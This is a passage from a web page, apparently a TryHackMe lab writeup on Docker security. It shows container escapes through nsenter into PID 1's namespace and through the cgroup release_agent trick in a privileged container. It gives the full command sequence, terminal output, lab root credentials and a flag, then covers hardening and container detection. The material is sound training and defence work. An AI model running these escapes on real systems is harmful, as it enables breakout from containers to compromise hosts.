nonetheless. We&#x27;ll be invoking the <a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank" rel="noopener noreferrer">nsenter</a> command. To summarise, this command allows you to execute start processes and place them within the same namespace as another process.</p><p>Use the following exploit: <code>nsenter --target 1 --mount sh</code> which does the following:</p><ol><li>We use the <code>--target</code> switch with the value of &quot;1&quot; to execute our shell command that we later provide to execute in the namespace of the special system process ID, to get ultimate root!</li><li>Specifying <code>--mount</code> this is where we provide the mount namespace of the process that we are targeting. &quot;If no file is specified, enter the mount namespace of the target process.&quot; (<a href="https://man7.org/linux/man-pages/man1/nsenter.1.html" target="_blank" rel="noopener noreferrer">Man.org., 2013</a>)</li><li>As we are targeting  the &quot;<code>/sbin/init</code>&quot; process #1 (although it&#x27;s actually a symbolic link to &quot;<code>lib/systemd/systemd</code>&quot; for backwards-compatibility), we are using the namespace and permissions of the <a href="https://www.freedesktop.org/wiki/Software/systemd/" target="_blank" rel="noopener noreferrer">systemd</a> daemon for our new process (the shell)</li><li>Here&#x27;s where our process that will be executed into this privileged namespace: <code>sh</code> or a shell. This will execute in the same namespace (and therefore privileges of) the kernel.</li></ol><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/namespaces/esc2.png" class="img_ev3q"></p><p>You may need to &quot;Ctrl + C&quot; to cancel the exploit once or twice for this vulnerability to work, but as you can see below, we have escaped the docker container can look around the host OS (showing the change in hostname)</p><p>Remembering that our exploit is as follows: <code>nsenter --target 1 --mount sh</code></p><p>Attempt the exploit, you will know you are successful if you can <code>ls /home/cmnatic</code></p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-11-9-vulnerability-7-misconfigured-privileges-deploy-2">Task 11 9. Vulnerability #7: Misconfigured Privileges (Deploy #2)<a href="#task-11-9-vulnerability-7-misconfigured-privileges-deploy-2" class="hash-link" aria-label="Direct link to Task 11 9. Vulnerability #7: Misconfigured Privileges (Deploy #2)" title="Direct link to Task 11 9. Vulnerability #7: Misconfigured Privileges (Deploy #2)">​</a></h2><p><strong>9.1. Understanding Capabilities</strong></p><p>At it&#x27;s fundamental, Linux capabilities are root permissions given to processes or executables within the Linux kernel. These privileges allow for the granular assignment of privileges - rather than just assigning them all.</p><p>These capabilities determine what permissions a Docker container has to the operating system, and how they are interacted with. Docker containers can run in two modes:</p><ul><li>User mode</li><li>Privileged mode</li></ul><p>Let&#x27;s refer back to our diagram in Task 2 where we detail how containers run on the operating system to highlight the differences between these two modes:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/privileged-container-layers.png" class="img_ev3q"></p><p>Note how containers #1 and #2 are running is &quot;user&quot;/&quot;normal&quot; mode whereas container 3 is running in &quot;privileged&quot; mode. Containers running in &quot;user&quot; mode interact with the operating system through the Docker engine. Privileged containers, however, do not do this...instead, they bypass the Docker engine and have direct communication with the operating system.</p><p><strong>9.2. What does this mean for us?</strong></p><p>Well, if a container is running with privileged access to the operating system, we can effectively execute commands as root - perfect!</p><p>We can use a system package such as &quot;libcap2-bin&quot;&#x27;s <code>capsh</code> to list the capabilities our container has: <code>capsh --print</code> . I&#x27;ve highlighted a few interesting privileges that we have been given, but greatly encourage you to research into anymore that may be exploited! Privileges like these indicate that our container is running in privileged mode.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/listcap2.png" class="img_ev3q"></p><p>Before we begin to exploit this for ourselves, <strong>you will need to deploy the new Instance attached to this Task.</strong> The vulnerabilities of the previous VM conflict with this exploit.</p><p><strong>9.3. Connecting to the container:</strong></p><p>Connect to your new Instance using SSH with the following details:</p><ul><li>New Instance IP: MACHINE_IP</li><li>SSH Port: 2244</li><li>Username: root</li><li>Password: danny</li></ul><p>Allowing a few minutes for the new Instance to deploy, I&#x27;m going to demonstrate leveraging the &quot;sys_admin&quot; capability. We can confirm we have this capability by grepping the output of <code>capsh</code>:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/getcap1.png" class="img_ev3q"></p><p>This capability permits us to do multiple of things (which is listed <a href="https://linux.die.net/man/7/capabilities" target="_blank" rel="noopener noreferrer">here</a>), but we&#x27;re going to focus on the ability given to use us via &quot;sys_admin&quot; to be able to <a href="https://linux.die.net/man/2/mount" target="_blank" rel="noopener noreferrer">mount</a> files from the host OS into the container.</p><p>The code snippet below is based upon (but a modified) version of the <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so." target="_blank" rel="noopener noreferrer">Proof of Concept (PoC) created by Trailofbits</a> where they detail the inner-workings to this exploit well.</p><ol><li>mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</li><li>echo 1 &gt; /tmp/cgrp/x/notify_on_release</li><li>host_path=<code>sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab</code></li><li>echo &quot;$host_path/exploit&quot; &gt; /tmp/cgrp/release_agent</li><li>echo &#x27;#!/bin/sh&#x27; &gt; /exploit</li><li>echo &quot;cat /home/cmnatic/flag.txt &gt; $host_path/flag.txt&quot; &gt;&gt; /exploit</li><li>chmod a+x /exploit</li><li>sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</li></ol><p><strong>9.4. Let&#x27;s briefly summarise what happens here:</strong></p><p>9.4.1. We need to create a group to use the Linux kernel to write and execute our exploit. The kernel uses &quot;cgroups&quot; to manage processes on the operating system since we have capabilities to manage &quot;cgroups&quot; as root on the host, we&#x27;ll mount this to &quot;/tmp/cgrp&quot; on the container.</p><p>9.4.2. For our exploit to execute, we&#x27;ll need to tell Kernel to run our code. By adding &quot;1&quot; to &quot;/tmp/cgrp/x/notify_on_release&quot;, we&#x27;re telling the kernel to execute something once the &quot;cgroup&quot; finishes. (<a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt" target="_blank" rel="noopener noreferrer">Paul Menage., 2004</a>)</p><p>9.4.3. We find out where the containers files are stored on the host and store it as a variable</p><p>9.4.4. Where we then echo the location of the containers files into our &quot;/exploit&quot; and then ultimately to the &quot;release_agent&quot; which is what will be executed by the &quot;cgroup&quot; once it is released.</p><p>9.4.5. Let&#x27;s turn our exploit into a shell on the host</p><p>9.4.6. Execute a command to echo the host flag into a file named &quot;flag.txt&quot; in the container, once &quot;/exploit&quot; is executed</p><p>9.4.7. Make our exploit executable!</p><p>9.4.8. We create a process and store that into &quot;/tmp/cgrp/x/cgroup.procs&quot;</p><p>9.5. Loot:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit1.png" class="img_ev3q"></p><p>Logging into the new Instance as &quot;root&quot; and executing the code snippet, resulting in container escape.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/privileged-container/exploit2.png" class="img_ev3q"></p><p>Showing that the command we executed (/exploit) has grabbed the file from the host operating system.</p><p>Contents of &quot;flag.txt&quot; from the host operating system</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# echo 1 &gt; /tmp/cgrp/x/notify_on_release</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# host_path=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# echo &quot;$host_path/exploit&quot; &gt; /tmp/cgrp/release_agent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# echo &#x27;#!/bin/sh&#x27; &gt; /exploit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# echo &quot;cat /home/cmnatic/flag.txt &gt; $host_path/flag.txt&quot; &gt;&gt; /exploit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# chmod a+x /exploit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# sh -c &quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:~# cd /</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:/# ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bin  boot  dev  etc  exploit  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:/# cat flag.txt </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">thm{you_escaped_the_chains}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@8a9427527c82:/# </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>thm{you_escaped_the_chains}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-12-10-securing-your-container">Task 12 10. Securing Your Container<a href="#task-12-10-securing-your-container" class="hash-link" aria-label="Direct link to Task 12 10. Securing Your Container" title="Direct link to Task 12 10. Securing Your Container">​</a></h2><p>Let&#x27;s reflect back on the vulnerabilities that we have exploited. Not only have we learnt about the technology that is containerization, but also how these containers are a mere abstraction of the host&#x27;s operating system.</p><p><strong>10.1. The Principle of Least Privileges:</strong></p><p>Whilst this is an over-arching theme of InfoSec as a whole, we&#x27;ll pertain this to Docker...</p><p>Remember Docker images? The commands in these images will execute as root unless told otherwise. Let&#x27;s say you create a Docker image for your webserver, in this case, the service will run as root. If an attacker managed to exploit the web server, they would now have root permissions to the container and may be able to use the techniques we outlined in Task 10 and 11.</p><p><strong>10.2. Docker  Seccomp 101:</strong></p><p>Seccomp or &quot;Secure computing&quot; is a security feature of the Linux kernel, allowing us to restrict the capability of a container by determining the system calls it can make. <a href="http://docs.docker.oeynet.com/engine/security/seccomp/#pass-a-profile-for-a-container" target="_blank" rel="noopener noreferrer">Docker uses security profiles</a> for containers. For example, we can deny the container the ability to perform actions such as using the mount namespace  (see Task 10 for demonstration of this vulnerability) or any of the <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener noreferrer">Linux system calls</a>.</p><p><strong>10.3. Securing your Daemon:</strong></p><p>In later installs of the Docker engine, running a registry relies on the use of implementing self-signed SSL certificates behind a web server, where these certificates must then be distributed and trusted on every device that will be interacting with the registry. This is quite the hassle for developers wanting to setup quick environments - which goes against the entire point of Docker.</p><p>I&#x27;ve secured my containers</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-13-11-bonus-determining-if-were-in-a-container">Task 13 11. Bonus: Determining if we&#x27;re in a container<a href="#task-13-11-bonus-determining-if-were-in-a-container" class="hash-link" aria-label="Direct link to Task 13 11. Bonus: Determining if we&#x27;re in a container" title="Direct link to Task 13 11. Bonus: Determining if we&#x27;re in a container">​</a></h2><p><strong>11.1. Listing running processes:</strong></p><p>Containers, due to their isolated nature, will often have very little processes running in comparison to something such as a virtual machine. We can simply use <code>ps aux</code> to print the running processes. Note in the screenshot below that there are very few processes running?</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux1.png" class="img_ev3q"></p><p>A virtual machine has a tonne more processes running in comparison. In the case of my virtual machine, there were 312 at the time of listing.</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/psaux2.png" class="img_ev3q"></p><p><strong>11.2. Looking for .dockerenv</strong></p><p>Containers allow environment variables to be provided from the host operating system by the use of a &quot;.dockerenv&quot; file. This file is located in the &quot;/&quot; directory, and would exist on a container - even if no environment variables were provided: <code>cd / &amp;&amp; ls -lah</code></p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/dockerenv.png" class="img_ev3q"></p><p><strong>11.3. Those pesky cgroups</strong></p><p>Note how we utilised &quot;cgroups&quot; in Task 10. Cgroups are used by containerisation software such as LXC or Docker. Let&#x27;s look for them with by navigating to &quot;/proc/1&quot; and then catting  the &quot;cgroups&quot; file...It is worth mentioning that the &quot;cgroups&quot; file contains paths including the word &quot;docker&quot;:</p><p><img loading="lazy" src="https://assets.tryhackme.com/additional/docker-rodeo/detecting-container/cgroups.png" class="img_ev3q"></p><p>Confirming suspicions...</p><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-14-12-additional-material">Task 14 12. Additional Material<a href="#task-14-12-additional-material" class="hash-link" aria-label="Direct link to Task 14 12. Additional Material" title="Direct link to Task 14 12. Additional Material">​</a></h2><p><strong>12.1. Conclusion</strong></p><p>There are a few other exploits that I was not able to cover such as the dirtyc0w kernel exploitation. I implore you to get familiar with Docker, create your own instances and play around!</p><p>You may also find variants of the capabilities exploit such as &quot;runC&quot; interesting.</p><p>Anyways, I hope you enjoyed it! Don&#x27;t be afraid to stick around in this room and experiment. <a href="https://tryhackme.com/p/CMNatic" target="_blank" rel="noopener noreferrer">~CMNatic</a></p><p>12.2. Additional Material:</p><ul><li><a href="https://github.com/dirtycow/dirtycow.github.io" target="_blank" rel="noopener noreferrer">The Dirtyc0w kernel exploit</a></li><li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/" target="_blank" rel="noopener noreferrer">Exploiting runC (CVE-2019-5736)</a></li><li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so." target="_blank" rel="noopener noreferrer">Trailofbits&#x27; capabilities demonstration</a></li><li><a href="https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent" target="_blank" rel="noopener noreferrer">Cgroups101</a></li></ul><p>Finished!</p><p><code>No answer needed</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/The Blob Blog/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">The Blob Blog</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/The Impossible Challenge/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">The Impossible Challenge</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#-we-will-cover--the-topics" class="table-of-contents__link toc-highlight">💢 We will cover  the topics</a></li><li><a href="#task-1-1-preface-setting-up-docker-for-this-room-deploy-1" class="table-of-contents__link toc-highlight">Task 1 1. Preface: Setting up Docker for this Room (Deploy #1)</a></li><li><a href="#task-2-2-introduction-to-docker" class="table-of-contents__link toc-highlight">Task 2 2. Introduction to Docker</a></li><li><a href="#task-3-3-vulnerability-1-abusing-a-docker-registry" class="table-of-contents__link toc-highlight">Task 3 3. Vulnerability #1: Abusing a Docker Registry</a></li><li><a href="#task-4-31-what-is-a-docker-registry" class="table-of-contents__link toc-highlight">Task 4 3.1. What is a Docker Registry?</a></li><li><a href="#task-5-32-interacting-with-a-docker-registry" class="table-of-contents__link toc-highlight">Task 5 3.2. Interacting with a Docker Registry</a></li><li><a href="#task-6-4-vulnerability-2-reverse-engineering-docker-images" class="table-of-contents__link toc-highlight">Task 6 4. Vulnerability #2: Reverse Engineering Docker Images</a></li><li><a href="#task-7-5-vulnerability-3-uploading-malicious-docker-images" class="table-of-contents__link toc-highlight">Task 7 5. Vulnerability #3: Uploading Malicious Docker Images</a></li><li><a href="#task-8-6-vulnerability-4-rce-via-exposed-docker-daemon" class="table-of-contents__link toc-highlight">Task 8 6. Vulnerability #4: RCE via Exposed Docker Daemon</a></li><li><a href="#task-9-7-vulnerability-5-escape-via-exposed-docker-daemon" class="table-of-contents__link toc-highlight">Task 9 7. Vulnerability #5: Escape via Exposed Docker Daemon</a></li><li><a href="#task-10-8-vulnerability-6-shared-namespaces" class="table-of-contents__link toc-highlight">Task 10 8. Vulnerability #6: Shared Namespaces</a></li><li><a href="#task-11-9-vulnerability-7-misconfigured-privileges-deploy-2" class="table-of-contents__link toc-highlight">Task 11 9. Vulnerability #7: Misconfigured Privileges (Deploy #2)</a></li><li><a href="#task-12-10-securing-your-container" class="table-of-contents__link toc-highlight">Task 12 10. Securing Your Container</a></li><li><a href="#task-13-11-bonus-determining-if-were-in-a-container" class="table-of-contents__link toc-highlight">Task 13 11. Bonus: Determining if we&#39;re in a container</a></li><li><a href="#task-14-12-additional-material" class="table-of-contents__link toc-highlight">Task 14 12. Additional Material</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>